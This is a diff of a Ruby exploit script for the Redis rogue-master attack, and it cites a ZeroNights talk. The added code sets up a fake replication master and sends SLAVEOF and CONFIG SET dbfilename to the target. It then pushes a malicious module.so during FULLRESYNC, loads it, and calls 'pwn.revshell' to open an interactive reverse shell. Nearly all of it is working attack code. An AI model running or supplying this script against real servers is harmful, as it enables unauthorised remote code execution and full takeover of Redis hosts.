@@ -1,11 +1,6 @@
 #https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
 
-require 'socket'
-
-server = TCPServer.new 2421 # Server bind to port 2000
-
-s = TCPSocket.new('localhost', 6379)
-s.puts "SLAVEOF 127.0.0.1 2421"
+require "socket"
 
 class Log
 
@@ -41,6 +36,23 @@ class Log
 
 end
 
+def error msg
+	Log.err msg
+	exit 1
+end
+
+#Our MASTER server
+server = TCPServer.new 2421
+
+#We use this connection to force the server to connect to our master server
+s = TCPSocket.new('localhost', 6379)
+Log.info "Sending SLAVEOF command"
+s.puts "SLAVEOF 127.0.0.1 2421"
+error "Failed to send SLAVEOF" if !s.gets.start_with? "+OK"
+Log.info "Renaming database file"
+s.puts "CONFIG SET dbfilename pwn"
+error "Failed to set dbfilename" if !s.gets.start_with? "+OK"
+
 class String
 	def is_number?
 		true if Float(self) rescue false
@@ -59,7 +71,6 @@ def rec
 		raise
 	end
 	msg.gsub!(/[\r\n]/, "")
-	Log.rec msg
 	return msg || ""
 end
 
@@ -81,26 +92,67 @@ def parser msg
 	return arguments
 end
 
-#loop do
-	@client = server.accept
-	Log.succ "Succesful connection"
-	begin
-		loop do
-			if msg = rec
-				arguments = parser msg
-				Log.info arguments.join " "
-				next if !arguments
-				case arguments[0]
-				when "PING"
-					send "+PONG"
-				when "REPLCONF"
-					send "+OK"
-				when "PSYNC"
-					send "+CONTINUE #{arguments[1]} 0"
-				end
-			end
+payload = File.read("module/module.so")
+
+#We only accept once, it will attempt to make new connections because our data is invalid
+@client = server.accept
+Log.succ "Succesful connection with slave"
+
+@payload_send = false
+
+# Resync database
+loop do
+	if msg = rec
+		arguments = parser msg
+		Log.rec arguments.join " "
+		next if !arguments
+		case arguments[0]
+		when "PING"
+			send "+PONG"
+		when "REPLCONF"
+			send "+OK"
+		when "PSYNC", "SYNC"
+			#send "+CONTINUE #{arguments[1]} 0"
+			send "+FULLRESYNC #{"A" * 40} 1\r\n"
+			Log.info "Sending payload..."
+			@client.puts "$#{payload.length}\r\n#{payload}"
+			@payload_send = true
+
+			#This socket is dead
+			break
+
 		end
+	end
+end
+
+error "Database resync failed, payload not send" if @payload_send == false
+
+@client = s #Reuse old connection to send commands
+
+sleep 0.5
+Log.info "Attempt to load module"
+send "module load ./pwn"
+error "Failed to load module (if it's already loaded use the -s flag)" if !s.gets.start_with? "+OK"
+Log.succ "Succesfully loaded the module"
+
+server = TCPServer.new 1234
+
+send "pwn.revshell 127.0.0.1 1234"
+
+shell = server.accept
+
+error "Error connecting to LHOST" if !s.gets.start_with? "+OK"
+Log.succ "Succesfull connect-back"
+
+Log.info "Starting (fully upgradeable) shell"
+
+loop do
+	begin
+		print shell.read_nonblock(1)
 	rescue
 	end
-#end
-
+	begin
+		shell.write STDIN.read_nonblock(1)
+	rescue
+	end
+end
